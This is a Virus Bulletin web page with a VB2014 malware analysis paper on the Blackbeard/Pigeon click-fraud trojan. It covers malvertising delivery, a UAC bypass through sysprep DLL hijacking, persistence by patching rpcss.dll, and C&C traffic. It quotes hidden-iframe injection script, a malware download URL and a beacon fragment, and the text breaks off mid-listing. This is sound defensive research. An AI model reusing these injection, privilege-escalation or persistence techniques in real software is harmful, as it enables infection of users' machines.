<!DOCTYPE html>
<html lang="en" class="no-js">
<head>
<meta http-equiv="X-UA-Compatible" content="IE=edge">

<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">

<script type="text/javascript">var BOOTSTRAP_VERSION ="lumen";
	var BOOTSTRAP_JS_HEAD =1;
	var BOOTSTRAP_CDN_ENABLE =0; var BOOTSTRAP_NAVBAR_TYPE =0; var BOOTSTRAP_LOGO_OPTION =0; var BOOTSTRAP_NAVBAR =1; var BootstrapInputFix =true;var BootstrapNavbarLineHeightFix =true;var BOOTSTRAP_EDT= 0; </script>
<meta http-equiv="content-type" content="text/html; charset=UTF-8" />
<title>Virus Bulletin :: VB2014 paper: Notes on click fraud: American story</title>
<meta name="description" content="The Blackbeard/Pigeon clickbot follows the path that was previously set by ZeroAccess. It uses a sophisticated method to stay persistent in a victim’s computer. Analysing this kind of threat is not a straightforward task, because the entire process is divided into several stages, running in several different processes and requiring different resources and permissions. In their VB2014 paper, Peter Kálnai and Jaromír Horejší provide an in-depth analysis of the clickbot and its interesting and behavioural aspects." />
<meta name="generator" content="concrete5 - 5.6.3.5" />
<script type="text/javascript">
var CCM_DISPATCHER_FILENAME = '/index.php';var CCM_CID = 1542;var CCM_EDIT_MODE = false;var CCM_ARRANGE_MODE = false;var CCM_IMAGE_PATH = "/concrete/images";
var CCM_TOOLS_PATH = "/index.php/tools/required";
var CCM_BASE_URL = "https://www.virusbulletin.com";
var CCM_REL = "";

</script>
<link rel="shortcut icon" href="/files/8914/5459/9485/VBIcon.png" type="image/x-icon" />
<link rel="icon" href="/files/8914/5459/9485/VBIcon.png" type="image/x-icon" />
<link rel="stylesheet" type="text/css" href="/concrete/css/ccm.base.css" />
<script type="text/javascript" src="/concrete/js/jquery.js"></script>
<script type="text/javascript" src="/concrete/js/ccm.base.js"></script>
<script type="text/javascript">
var COOKIES_ALLOWED=false;
</script>
<link rel="stylesheet" type="text/css" href="/packages/free_cookies_disclosure/css/cookies_disclosure.css" />
<!--[if lte IE 8]><link rel="stylesheet" type="text/css" href="/packages/free_cookies_disclosure/css/cookies_disclosure_ie.css" /><![endif]-->
<script type="text/javascript">
var COOKIES_DISCLOSURE_HIDE_INTERVAL=10;
</script>
<script type="text/javascript" src="/packages/free_cookies_disclosure/js/disclosure_hide.js"></script>
<link rel="stylesheet" type="text/css" href="/packages/bootstrap/css/lumen/bootstrap.css" />
<link rel="stylesheet" type="text/css" href="/packages/bootstrap/css/lumen/bootstrap-overwrites.css" />
<link rel="stylesheet" type="text/css" href="/packages/bootstrap/css/members.css" />
<script type="text/javascript" src="/packages/bootstrap/js/common/prettify.js"></script>
<script type="text/javascript" src="/packages/bootstrap/js/common/jquery.easing.1.3.js"></script>
<script type="text/javascript" src="/packages/bootstrap/js/common/bootstrap.min.js"></script>
<link rel="stylesheet" type="text/css" href="/libraries/css/jquery.fancybox.css" />
<script type="text/javascript" src="/libraries/js/jquery.fancybox.pack.js"></script>
<link rel="stylesheet" media="screen" type="text/css" href="/files/cache/css/bootstrap/typography.css" />
<script type="text/javascript" src="/index.php/tools/packages/free_cookies_disclosure/disclosure_i18n_js"></script>
<script type="text/javascript" src="/packages/free_cookies_disclosure/js/disclosure_ajax_form.js"></script>
<link rel="stylesheet" type="text/css" href="/concrete/blocks/page_list/view.css" />
<link rel="stylesheet" type="text/css" href="/packages/remo_expand/blocks/remo_expand/templates/vbexpand/view.css" />
<script type="text/javascript" src="/packages/remo_expand/js/jquery.color.js"></script>
<script type="text/javascript" src="/packages/remo_expand/js/jquery.ba-hashchange.js"></script>
<script type="text/javascript" src="/packages/remo_expand/js/remo.expand.js"></script>
<link rel="stylesheet" type="text/css" href="/packages/bootstrap/blocks/search/templates/VB_global_search/view.css" />
<link rel="stylesheet" type="text/css" href="/packages/travisn_spacer/css/ccm.tnspacer.css" />

<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.6.3/css/font-awesome.min.css" integrity="sha384-T8Gy5hrqNKT+hzMclPo118YTQO6cYprQmhrYwIiQ/3axmI1hQomh7Ud2hPOy8SP1" crossorigin="anonymous">

<script src="https://cdnjs.cloudflare.com/ajax/libs/prettify/r298/run_prettify.js" integrity="sha256-1SFdTXlsw0RkQ+iO0E91LDshGiIbPiTYqJto0px4wds=" crossorigin="anonymous"></script>
<!--[if gte IE 9]>
<script src="/packages/bootstrap/js/common/modernizr.js"></script>
<![endif]-->

<!--[if lt IE 9]>	
	
	<script src="/packages/bootstrap/js/common/html5shiv.js"></script>
	<script src="/packages/bootstrap/js/common/respond.min.js"></script>
	
<![endif]-->
</head>
<body data-spy="scroll" data-target=".bs-sidebar">

<div class="navbar  navbar-fixed-top navbar-default  bs-docs-nav">
<div class="navbar-inner">
<div class="container"><div class="row"><div class="col-sm-4 col-md-4 logo-position-1 col-logo">
<div class="navbar-header">
<button type="button" class="navbar-toggle btn_navbar_custom">
<span class="icon-bar"></span>
<span class="icon-bar"></span>
<span class="icon-bar"></span>
</button><div class="mobile-clearfix"></div><div class="navbar-brand navbar-brand-area"><a href="/"><img border="0" class="ccm-image-block" alt="" src="/files/4614/4535/7515/logo-big.png" width="339" height="92" /></a></div> </div>
</div><div class="col-sm-8 col-md-8 logo-position-1 col-nav"> <div class="nav-collapse collapse nav_collapse_custom navbar-collapse"> <div style="clear:both"></div>
<div class="vb-global-search-div">
<form action="/index.php/global-search-results/" method="get">
<fieldset>
<input name="search_paths[]" type="hidden" value="" />
<input name="query" type="text" class="vb-global-search" placeholder="Search site..." />
<input name="submit" type="submit" value="Search!" style="display:none" />
</fieldset>
</form>
</div>
<div class="tnSpacer" style="height:48px"></div>
<ul class="nav nav-pills"><li class=" nav-first nav-item-6299"><a href="/newsletter/" target="_self" class=" nav-first nav-item-6299 ">Newsletter</a></li><li class=" nav-item-260"><a href="/conference/" target="_self" class=" nav-item-260 ">VB Conference</a></li><li class=" nav-item-166"><a href="/testing/" target="_self" class=" nav-item-166 ">VB Testing</a></li><li class=" nav-path-selected active nav-item-160"><a href="/virusbulletin/" target="_self" class=" nav-path-selected active nav-item-160 ">Bulletin</a></li><li class=" nav-last nav-item-130"><a href="/blog/" target="_self" class=" nav-last nav-item-130 ">Blog</a></li></ul> </div>
</div>
</div><div class="clearfix"></div>
</div>
</div>
</div>
<div class="navbar-top-fixed-space "><div class="clearfix"></div></div>

<div class="container m-top-20">
<div class="row">
<div class="col-md-9 col-sm-9 col-lg-9">
<div class="titlepage" xmlns=""><div><div><h1 class="title" xmlns="http://www.w3.org/1999/xhtml"><a id="vb201601-click-fraud"></a>VB2014 paper: Notes on click fraud: American story</h1></div><div><p class="pubdate" xmlns="http://www.w3.org/1999/xhtml">2016-01-01</p></div><div><div class="authorgroup" xmlns="http://www.w3.org/1999/xhtml"><div class="author titlepage"><h3 class="author"><span class="firstname">Peter</span> <span class="surname">K&aacute;lnai </span></h3><span class="orgname">AVAST Software</span>, <span class="orgdiv">Czech Republic</span></div><div class="author titlepage"><h3 class="author"><span class="firstname">Jarom&iacute;r </span> <span class="surname">Horej&scaron;&iacute;</span></h3><span class="orgname">AVAST Software</span>, <span class="orgdiv">Czech Republic</span></div><b class="editedby">Editor: </b><span class="editor"><span class="firstname">Martijn</span> <span class="surname">Grooten</span></span></div></div><div><div class="abstract" xmlns="http://www.w3.org/1999/xhtml"><p class="title"><b>Abstract</b></p><p>The Blackbeard/Pigeon clickbot follows the path that was previously set by ZeroAccess. It uses a sophisticated method to stay persistent in a victim&rsquo;s computer. Analysing this kind of threat is not a straightforward task, because the entire process is divided into several stages, running in several different processes and requiring different resources and permissions. In their VB2014 paper, Peter K&aacute;lnai and Jarom&iacute;r Horej&scaron;&iacute; provide an in-depth analysis of the clickbot and its interesting and behavioural aspects.</p></div></div><div><p class="copyright" xmlns="http://www.w3.org/1999/xhtml"><i>Copyright &copy; 2014 Virus Bulletin</i></p></div></div><hr /></div>
<div class="ccm-remo-expand">
<div id="ccm-remo-expand-title-2067" class="ccm-remo-expand-title ccm-remo-expand-closed" data-expander-speed="200">Table of contents</div><div id="ccm-remo-expand-content-2067" class="ccm-remo-expand-content"><div class="toc"><dl><dt><span class="sect1"><a href="#id3618333">Abstract</a></span></dt><dt><span class="sect1"><a href="#id3373308">1. Introduction</a></span></dt><dt><span class="sect1"><a href="#id3590927">2. Distribution</a></span></dt><dt><span class="sect1"><a href="#id4394880">3. Structure and behaviour</a></span></dt><dd><dl><dt><span class="sect2"><a href="#id3122727">3.1 Binary structure</a></span></dt><dt><span class="sect2"><a href="#id2616897">3.2 32-bit to 64-bit transition</a></span></dt><dt><span class="sect2"><a href="#id4222563">3.3 Privilege elevation</a></span></dt><dt><span class="sect2"><a href="#id3782994">3.4 Persistence</a></span></dt><dt><span class="sect2"><a href="#id4622116">3.5 Communication protocol</a></span></dt></dl></dd><dt><span class="sect1"><a href="#id2880934">4. Comparison of clickbot modules</a></span></dt><dd><dl><dt><span class="sect2"><a href="#id2812486">4.1 Pigeon</a></span></dt><dt><span class="sect2"><a href="#id4341670">4.2 Alureon </a></span></dt><dt><span class="sect2"><a href="#id2851945">4.3 Wowlik </a></span></dt><dt><span class="sect2"><a href="#id4378462">4.4 ZeroAccess/Sirefef </a></span></dt><dt><span class="sect2"><a href="#id3492647">4.5 Summary</a></span></dt></dl></dd><dt><span class="sect1"><a href="#id3240514">5. Conclusion</a></span></dt><dt><span class="sect1"><a href="#id4909161">Acknowledgement</a></span></dt><dt><span class="sect1"><a href="#id4114657">Appendix: Samples</a></span></dt></dl></div></div></div><div class="sect1" lang="en"><div class="titlepage"><div><div><h2 class="title"><a class="chapter" id="id3618333"></a>Abstract</h2></div></div></div><p>The estimated beginning of this &lsquo;American&rsquo; story is in the middle of 2013. An infection chain runs through a malvertising campaign with Java exploitation and ends up dropping a payload with the filename &lsquo;notepad.exe&rsquo;. The main goal of almost all instances of this particular threat is to gain revenue from simulated clicking on online advertisements. Only computers in the United States are targeted. The families of trojans dropped as the final payload share many characteristics, such as possessing both 32-bit and 64-bit variants and using sophisticated stealth techniques for persistence. These include variants of the well known Win32/64:Alureon rootkit and the Win32/64:Blackbeard downloader that was rediscovered at the turn of the year. With this level of complexity, the trojans continue the trend set by one of the most sophisticated threats to perform click fraud, namely Win32/64:ZeroAccess/Sirefef. </p><p>In this paper we focus on the in-depth analysis of these <span class="emphasis"><em>Windows</em></span> executables and their interesting structural and behavioural aspects. This involves explaining methods that fulfil the need for elevated privileges, the 32-bit to 64-bit code execution switch if executed in a 64-bit environment, and a description of the communication protocol. Moreover, we will provide an overall comparison of clickbot modules of all mentioned threats and discuss the similarities and the differences in the code they use. </p></div><div class="sect1" lang="en"><div class="titlepage"><div><div><h2 class="title"><a class="chapter" id="id3373308"></a>1. Introduction</h2></div></div></div><p>At the beginning of 2014, a trojan that had previously not been discussed much (with a brand new final payload) started to appear in the wild. It was remarkable in many interesting ways: it possessed a complex structure containing both 32-bit and 64 bit code; its persistence was secured through highly invasive methods; and it displayed a robustness in its ability to contain additional payloads and modules. After a brief investigation of PE header characteristics, a very similar sample from February 2012 was found, which contained debug info with the string &lsquo;Blackbeard&rsquo;. This led to the nickname of the threat. It is common to find that if a threat contains more advanced features, then its distribution paths also switch from trivial social engineering methods to code execution based on exploitation. Indeed, the data from an internal telemetry system suggested a traffic redirection behind a particular Java exploitation selecting victims exclusively in the United States. </p><div class="figure"><a id="figure.1"></a><div class="mediaobject"><img alt="The sample contained debug info with the string &lsquo;Blackbeard&rsquo;." src="/uploads/images/figures/2016/01/KalnaiHorejsi-1.jpg" /></div><p class="title"><b>Figure&nbsp;1.&nbsp;The sample contained debug info with the string &lsquo;Blackbeard&rsquo;. </b></p></div></div><div class="sect1" lang="en"><div class="titlepage"><div><div><h2 class="title"><a class="chapter" id="id3590927"></a>2. Distribution</h2></div></div></div><p>The infection chain starts with malvertising, where malicious redirection is incorporated into the script code of an infected advertisement. A malicious Java applet is loaded, which creates and drops the notepad.exe file into the %TEMP% directory. The suspected malvertising code is JavaScript, as shown in Listing 1. An iframe with very small dimensions is injected via the document.writeln method. The same chain of exploitation has been observed and reported in [<span class="citation"><a href="#citation.1">1</a></span>], [<span class="citation"><a href="#citation.2">2</a></span>].</p><pre class="programlisting">&lt;script type=&rdquo;text/javascript&rdquo;&gt;
{
var dz=document;dz.writeln(&ldquo;&lt;style&gt;#___r___yw {visibility:hidden;}
&lt;/style&gt;
&lt;iframe src=\&rdquo;http://
&lt;url&gt;/uvxj/etkz.php?endovenafsl=&lt;data&gt;&amp;br=0920899\&rdquo; marginwidth=\&rdquo;0\&rdquo; width=\&rdquo;13\&rdquo; height=\&rdquo;12\&rdquo; id=___r___yw hspace=\&rdquo;0\&rdquo; vspace=\&rdquo;0\&rdquo;  marginheight=\&rdquo;0\&rdquo; scrolling=\&rdquo;no\&rdquo; frameborder=\&rdquo;0\&rdquo;&gt;
&lt;/IFRAME&gt;&rdquo;);
}
&lt;/script&gt; 

<span class="bold"><strong>Listing 1: The suspected malvertising code is JavaScript.</strong></span>
</pre></div><div class="sect1" lang="en"><div class="titlepage"><div><div><h2 class="title"><a class="chapter" id="id4394880"></a>3. Structure and behaviour</h2></div></div></div><p>In the subsections 3.2 and 3.3 the mentioned memory addresses implicitly refer to the Blackbeard sample 3B2DBA499FC805C363F91940FDAC01D376F7F93F958CADC249F456DD239C78C2.</p><div class="sect2" lang="en"><div class="titlepage"><div><div><h3 class="title"><a class="chapter" id="id3122727"></a>3.1 Binary structure</h3></div></div></div><p>Since the early version of the downloader (from February 2012), we have observed the evolution of its structure. The variant described in early 2014 [<span class="citation"><a href="#citation.3">3</a></span>] distributed its own trojan features via drive-by download. The binary layout of the first stage starts with an x86 downloader, followed by procedures responsible for the x86 UAC privilege elevation, an x64 downloader and x64 UAC procedures. This downloader then requests the second stage, containing the debug string &lsquo;Pigeon&rsquo;. This is the main module, which contains x86/x64 code, the rpcss.dll inject and C&amp;C domain list, and is responsible for downloading clickbot modules (the third stage). </p><p>The latest variant of the Blackbeard downloader, which lacks the drive-by download feature, was discovered in April 2014. The code corresponding to the previous second stage is embedded and packed with LZO compression [<span class="citation"><a href="#citation.4">4</a></span>] in the body of the binary. The clickbot module might or might not be embedded at the end of the binary and encrypted with the same 32-bit RC4 cipher. This altered variant can use a different final payload (e.g. a proxy client) and it can be distributed by a different exploitation chain (in countries outside of the USA). All the parts of the malware &ndash; the downloader, Pigeon and the clickbot modules &ndash; are included in one binary package. Their layout is shown in <a href="#figure.2">Figure 2</a>. It is interesting to note that the Pigeon module is compressed with LZO compression and the clickbot modules are encrypted with the RC4 algorithm with a hard-coded 32-bit key. </p><div class="figure"><a id="figure.2"></a><div class="mediaobject"><img alt="Evolution of the Blackbeard/Pigeon structure." src="/uploads/images/figures/2016/01/KalnaiHorejsi-2.jpg" /></div><p class="title"><b>Figure&nbsp;2.&nbsp;Evolution of the Blackbeard/Pigeon structure.</b></p></div><p>(Click <a href="/uploads/images/figures/2014/12/KalnaiHorejsi-2-large.jpg" target="_top">here</a> to view a larger version of Figure 2.)</p></div><div class="sect2" lang="en"><div class="titlepage"><div><div><h3 class="title"><a class="chapter" id="id2616897"></a>3.2 32-bit to 64-bit transition</h3></div></div></div><p>As is the case with almost all high-profile malware, the first stage is custom packed with a cryptor. After extracting the proper downloader, we can see that it is written in a robust way. The same code can be run in either a 32-bit or 64-bit environment, which the code itself decides on the fly, based on the entry point of the unpacked layer. The malware authors can therefore encapsulate their downloader in either a 32-bit or 64 bit cryptor and it will be executed in both environments. </p><p>At first, we notice a sequence of push, pop, rol, test, jnz instructions. When run in different environments, these instructions produce different results. Depending on the result, a conditional jump is either taken or not taken. These initial instructions run in both 32-bit and 64-bit environments. After the first conditional jump (jnz) there are two branches running in 32-bit and WoW64 64-bit environments, respectively. </p><div class="figure"><a id="figure.3"></a><div class="mediaobject"><img alt="The initial instructions run in both 32-bit and 64-bit environments. After the first conditional jump (jnz) there are two branches running in 32-bit and 64-bit environments." src="/uploads/images/figures/2016/01/KalnaiHorejsi-3.jpg" /></div><p class="title"><b>Figure&nbsp;3.&nbsp;The initial instructions run in both 32-bit and 64-bit environments. After the first conditional jump (jnz) there are two branches running in 32-bit and 64-bit environments.</b></p></div><p>(Click <a href="/uploads/images/figures/2014/12/KalnaiHorejsi-3-large.jpg" target="_top">here</a> to view a larger version of Figure 3.)</p><p>Under the 64-bit environment, the value 0x40000000 is pushed into the RCX register. Even after rotation by two positions to the left, ECX remains zero (ZF is set), so the conditional jump is not taken, and the 64-bit code is executed. The downloader simply gets its image base, adds the relative virtual address of the 64-bit payload function, and executes it. </p><p>Under the 32-bit environment, the value 0x40000000 is pushed into the ECX register, which is then rotated by two positions to the left, causing ECX to hold value 1. The instruction &lsquo;test ecx, ecx&rsquo; does not set a zero flag (ZF), so the conditional jump is taken and the 32-bit branch of code is executed. </p><p>32-bit applications can be executed on both 32-bit and 64 bit operating systems. The processor architecture is decided by the GetNativeSystemInfo function. The expected result is either 0x00 or 0x09, which stands for PROCESSOR_ARCHITECTURE_INTEL (x86) or PROCESSOR_ARCHITECTURE_AMD64 (x64), respectively. </p><p>The wProcessorArchitecture information is compared at address 0x4010e0. Depending on whether the x86 or x64 architecture is detected, the conditional jump at this address decides whether the inWin32 function or the inWoW64 function is executed. </p><p>When executing a 32-bit application on a 64-bit operating system, the 32-bit application runs an emulation of a 32-bit operating system, which is called <span class="emphasis"><em>Windows on Windows64</em></span> (shortened to WoW64). WoW64 intercepts system calls made by the 32-bit application, converts 32-bit data structures into 64-bit data structures, and invokes 64-bit system calls. After the 64-bit system call has finished, it translates any output data structures from 64-bit back to 32-bit data structures. The WoW64 subsystem is implemented using three dynamic link libraries: Wow64.dll, Wow64win.dll and Wow64cpu.dll. Wow64.dll takes care of translations from 32-bit to 64-bit, Wow64win.dll provides entry points for 32-bit applications, and Wow64cpu.dll switches the processor from 32-bit mode to 64 bit mode. The interesting part of downloader starts at address 0x40112c, where it calls the function at 0x401000. </p><p>The called function then resolves base addresses of the three above-mentioned fundamental WoW64 libraries. In addition to these, it also retrieves the virtual address of an important structure from Wow64win.dll &ndash; the sdwhwin32JumpTable table. </p><p>At 0x40105f, it resolves the address of GDI32!BRUSHOBJ_hGetColorTransform, which is a function that is exported from the gdi32.dll library. The resolved address is stored in the EBX register. Later, at 0x401066, the system call ordinal is extracted from the first instruction of the call. </p><p>If we want to get the address of a function in sdwhwin32JumpTable, we first subtract 0x1000 from its ordinal number, then multiply it by eight (in the 64-bit system, each pointer has eight bytes) and add it to the beginning of the sdwhwin32JumpTable. In our case: </p><p>0x78bbfae0 + 0x129 * 8 = 0x78bc0428</p><p>However, in the analysed downloader, something more stealthy happens. At 0x401083, the address corresponding to BRUSHOBJ_hGetColorTransform in sdwhwin32JumpTable is overwritten by a user-specified address (0x40ad70). <a href="#figure.4">Figure 4</a> shows the situation before and after the overwriting has been done. </p><div class="figure"><a id="figure.4"></a><div class="mediaobject"><img alt="Before and after the overwriting has been done." src="/uploads/images/figures/2016/01/KalnaiHorejsi-4.jpg" /></div><p class="title"><b>Figure&nbsp;4.&nbsp;Before and after the overwriting has been done.</b></p></div><p>(Click <a href="/uploads/images/figures/2014/12/KalnaiHorejsi-4-large.jpg" target="_top">here</a> to view a larger version of Figure 4.)</p><p>Next, the instruction &lsquo;call ebx&rsquo; is executed at the address 0x40108a, which is supposed to invoke BRUSHOBJ_hGetColorTransform. The instruction flow then continues into the gdi32.dll library (BRUSHOBJ_hGetColorTransform), until it reaches the call to the address stored at fs:[0xc0], which points to the wow64cpu!X86SwitchTo64BitMode function. </p><p>The DWORD at address fs:[0x0c0] contains an address with a jump causing a switch to the 64-bit environment (segment 0x33 determines the 64-bit environment). The 64-bit environment starts at wow64cpu!CpupReturnFromSimulatedCode, which contains the call toWow64SystemServiceEx. Before calling Wow64SystemServiceEx, several interesting parameters are passed: 0x7559fae0 is the beginning of sdwhwin32JumpTable in wow64win.dll; 0x129 is an ordinal of BRUSHOBJ_hGetColorTransform in sdwhwin32JumpTable; and 0x766e5c55 is the beginning of BRUSHOBJ_hGetColorTransform in gdi32.dll. Inside Wow64SystemServiceEx, the address of BRUSHOBJ_hGetColorTransform in sdwhwin32JumpTable is computed and called at 0x755bcf84 (call r12). Instead of the original address, code from the patched address is executed. At this point, a 64-bit payload is executed within the loader. The 64-bit payload begins at address 0x40ad70. </p><p>You might wonder why such a complicated transition from 32 bit to 64-bit environment is made. The malware could, of course, run only in the 32-bit environment, and a 64-bit version would not be necessary. However, the malware described is just a downloader and a loader which downloads another payload. Access to 64-bit running processes (e.g. web browsers) is desirable for the payload due to the possibility of easier code injection. Although there have been some hacks [<span class="citation"><a href="#citation.5">5</a></span>] which describe how to access the memory of a 64-bit process from a 32-bit process, it is easier to use straightforward 64-bit to 64-bit access. </p></div><div class="sect2" lang="en"><div class="titlepage"><div><div><h3 class="title"><a class="chapter" id="id4222563"></a>3.3 Privilege elevation</h3></div></div></div><p>Before executing the payload itself, it is important to make sure that it is running with elevated privileges. Without those, the privilege for taking ownership (SeTakeOwnershipPrivilege) cannot be acquired, security permissions for system files cannot be changed, and persistence cannot be established. An important part of the code occurs around the address 0x409a2e. Depending on the function parameters, getDelta can be resolved in four different addresses and later at 0x409a90, calling four different functions. If one function fails, another one is called. The first function (0x409bcc) does nothing special, it just tries to acquire SeTakeOwnershipPrivilege. If the malware is not running with elevated privileges, this function fails. The second function (0x409efc) is more interesting. The system API ShellExecuteW is resolved with the parameter &lsquo;runas&rsquo; to run a file with elevated privileges. The code uses the <span class="emphasis"><em>System Preparation</em></span> tool (sysprep.exe), which is a tool that &lsquo;prepares an installation of Windows for duplication, auditing, and customer delivery.&rsquo; Sysprep is an application that needs administrative rights every time it is executed, and it is also a whitelisted UAC application [<span class="citation"><a href="#citation.6">6</a></span>]. Whitelisting allows users with lower than administrative rights to run applications with full administrative rights while UAC settings are still set to the highest security.</p><p>There is a proof-of-concept for <span class="emphasis"><em>Windows 7 </em></span>UAC whitelisting [<span class="citation"><a href="#citation.7">7</a></span>], which uses the above-mentioned feature. At first, a random DLL library is copied from the %WINDOWS%\System32 folder to the %APPDATA%\Roaming folder under a randomly generated name. The newly copied file is patched and then, with the help of IFileOperation, it is copied into the sysprep directory under the name &lsquo;cryptbase.dll&rsquo;. When sysprep.exe is executed, it loads the cryptbase.dll library from the System32 directory. If we put a fake cryptbase.dll library into the sysprep directory, it will load the fake library instead of the real one. Sysprep is an elevated process, so everything it loads is also elevated. To bypass UAC on <span class="emphasis"><em>Windows 7</em></span>, it is necessary to be an administrator. A second function also checks SIDs to make sure an administrator account is present. If it is running under only a standard user account, the second method fails.</p><p>The third function (0x4086c0) exploits CVE-2013-3660 [<span class="citation"><a href="#citation.8">8</a></span>]. If this function succeeds, a standard user can run programs under administrator privileges. </p><p>The last function (0x409c40) tries to run rundll32.exe &lt;random dll&gt;, System1. A random DLL is created with the same method as described for the second function; it is also stored in the same location (%APPDATA%\Roaming). </p><p>We have mentioned a few times that a particular system DLL is copied into %APPDATA%\Roaming and patched. The main function of the DLL is overwritten. Instead of its original function, it opens a previously created section object with the downloaded payload and calls its entry point function, which is 0x40ad70. It uses just four imported functions: NtOpenSection, NtMapViewOfSection, NtOpenEvent and NtSetEvent. To resolve the addresses of these imports, references to these libraries are overwritten in the DLL&rsquo;s import table. Finally, the main function of the library is overwritten. </p><p>If an attempt to bypass UAC via the above-mentioned methods is not successful, users may encounter (depending on UAC settings) one or more dialogs. The user is presented with a prompt where important system programs request higher privileges in the following order: File Operation, System Preparation Tool, <span class="emphasis"><em>Windows</em></span> host process (Rundll32). If the user does not grant the privileges, the infection does not happen. However, if the UAC bypass is successful, the user is infected and no UAC is displayed (no matter what the UAC settings are). </p></div><div class="sect2" lang="en"><div class="titlepage"><div><div><h3 class="title"><a class="chapter" id="id3782994"></a>3.4 Persistence</h3></div></div></div><p>The initial stage of the downloaded payload establishes persistence on the infected system. Unlike many other pieces of malware which modify registry keys or copy themselves into the Startup folder, we encountered a much stealthier and more complicated form of persistence. Instead of modifying the above-mentioned registry keys, an important system DLL is patched so that the payload is executed every time the operating system starts. Rpcss.dll is the chosen library to be patched. RPCSS stands for Remote Procedure Call System Service, which is a core service of RPC (Remote Procedure Call). This is an important technology for creating distributed client/server programs, running on all <span class="emphasis"><em>Windows</em></span> machines. It is an important system file, so the malware needs to perform a few steps before being able to overwrite it.</p><p>First, it attempts to acquire SeTakeOwnershipPrivilege. This privilege allows it to take ownership of any file. The default owner of rpcss.dll is a user called TrustedInstaller, who is the only one with full access (read, write, execute) to this system file. All other users, including SYSTEM, have only read and execute privileges by default. However, with SeTakeOwnershipPrivilege enabled, the owner of rpcss.dll can be changed to the current user. The malware then creates a new access control list (ACL) with two access control entries (ACE): current user and SYSTEM. This access list is then assigned (using SetNamedSecurityInfoW) to the rpcss.dll file. The result is that there are only two users with read/write/execute access &ndash; the current user and SYSTEM. Now it is possible to patch the DLL. </p><p>When patching the existing library, the best practice is to locate a block full of zeroes and replace it with executable code. However, the payload related to Blackbeard/Pigeon is more than 100KB, and it is not possible to find such a big block of zeros within rpcss.dll. Rpcss.dll contains only a small stub, which reads, decrypts, and executes the previously encrypted payload from a randomly named file in the %WINDOWS%\System32 directory. The payload is encrypted with a single-byte XOR operation. </p><p>If a regular user notices a suspiciously named file in the %WINDOWS%\System32 directory and tries to open the file and read it, access to the file will be revoked, because only the SYSTEM user has the right to do this. Rpcss.dll is executed by SYSTEM, so there is no problem in locating and reading the payload. Under <span class="emphasis"><em>Windows XP</em></span>, there are two instances of rpcss.dll: one located in %WINDOWS%\System32 and one in %WINDOWS%\System32\DllCache. Both instances must be patched. The loader also disables the Windows File Protection (WFP) mechanism by calling an undocumented API with ordinal 5 from the sfc_os.dll library. SfcFileException [<span class="citation"><a href="#citation.9">9</a></span>] should disable WFP on a specific file for one minute. </p><p>Rpcss.dll is a dynamic linked library. It is not patched at the entry point of its main function (Dllmain). The malware localizes the gaServiceEntryTable structure and offset where the pointer to KernelServiceMain is stored. The pointer to this function is patched so that it points to the newly inserted block of data. </p><div class="figure"><a id="figure.5"></a><div class="mediaobject"><img alt="The malware localizes the gaServiceEntryTable structure and offset where the pointer to KernelServiceMain is stored." src="/uploads/images/figures/2016/01/KalnaiHorejsi-5.jpg" /></div><p class="title"><b>Figure&nbsp;5.&nbsp;The malware localizes the gaServiceEntryTable structure and offset where the pointer to KernelServiceMain is stored.</b></p></div><p>(Click <a href="/uploads/images/figures/2014/12/KalnaiHorejsi-5-large.jpg" target="_top">here</a> to view a larger version of Figure 5.)</p><div class="figure"><a id="figure.6"></a><div class="mediaobject"><img alt="The pointer to the function is patched so that it points to the newly inserted block of data." src="/uploads/images/figures/2016/01/KalnaiHorejsi-6.jpg" /></div><p class="title"><b>Figure&nbsp;6.&nbsp;The pointer to the function is patched so that it points to the newly inserted block of data.</b></p></div><p>(Click <a href="/uploads/images/figures/2014/12/KalnaiHorejsi-6-large.jpg" target="_top">here</a> to view a larger version of Figure 6.)</p><p>The patched KernelServiceMain function starts with the getDelta assembly sequence (call $+5, pop), which returns the current address. Then it keeps subtracting 0x1000 until it finds the signature (MZ), which is the base address of the currently loaded library. The Decrypt_string procedure is a simple XOR loop, which decrypts the block of memory with the name of the file with the encrypted payload. </p><p>At this point, the malware is persistent on the compromised system. There are no traces of infection in the registry. A standard user may notice randomly named files in the %WINDOWS%\System32 directory, but neither he/she nor even an administrator has access to them (only SYSTEM can access them). Now it is time to spawn an Internet communication thread, download another payload and install it on the compromised system. </p></div><div class="sect2" lang="en"><div class="titlepage"><div><div><h3 class="title"><a class="chapter" id="id4622116"></a>3.5 Communication protocol</h3></div></div></div><div class="sect3" lang="en"><div class="titlepage"><div><div><h4 class="title"><a class="chapter" id="id3684784"></a>3.5.1 Downloading drive-by download payload</h4></div></div></div><p>When the architecture is finally decided, the downloader performs its main purpose &ndash; it downloads a payload from a hard coded site. Listing 2 shows the query.</p><pre class="programlisting">c8-sky-walk.org/load.php?id=10&amp;p=2&amp;t=0&amp;e=1

<span class="bold"><strong>Listing 2: Query string.</strong></span>
</pre><p>In the query, &lsquo;id&rsquo; is an identifier of a downloader that calls the query, and &lsquo;p&rsquo; can have two values (1 or 2 for the x86 and x64 variants of a module, respectively). </p><p>The downloaded content is encrypted and stored with a randomly generated name in the %WINDOWS%\System32 directory, e.g. bqpb.ozz. We observed that the downloaded file was encrypted by the RC4 cipher with a 32-bit key. No user has access to the file, only the system. </p></div><div class="sect3" lang="en"><div class="titlepage"><div><div><h4 class="title"><a class="chapter" id="id2766674"></a>3.5.2 Communication with C&amp;C</h4></div></div></div><p>Communication with the C&amp;C server is encrypted. The bot first collects system identification data, which is then encrypted using the <span class="emphasis"><em>Microsoft</em></span> Crypto API Provider. </p><p>The initial post always starts with &lsquo;0|&rsquo;, followed by the system id, which is stored in a randomly created file in %WINDOWS%\System32. &lsquo;p&rsquo; is the platform (1=x86, 2=x64); &lsquo;os&rsquo; is the operating system name; &lsquo;v&rsquo;, &lsquo;vc&rsquo; and &lsquo;b&rsquo; are probably version, subversion and build version respectively; and &lsquo;k&rsquo; is a randomly generated key. This information is encrypted before being sent back to the C&amp;C. In the binary, we can see a hard coded blob with the PUBLICKEYSTRUCT structure. Its parameters specify that we deal with PUBLICKEYBLOB (0x06), algorithm CALG_RSA_KEYX (0x0000a400). From the given binary blob, the key must first be imported using CryptImportKey from advapi32.dll. Calling advapi32.dll!CryptEncrypt finishes the task. The system information before encryption is shown in Listing 3. </p><pre class="programlisting">0|id:a4addcf9PYDuf3lKaD7vSiiyty2YqxqVY6g5935Ic5I7jOE1oK0t9bgJQ9e7Y68H|vp:2|p:1|os:Windows XP Service Pack 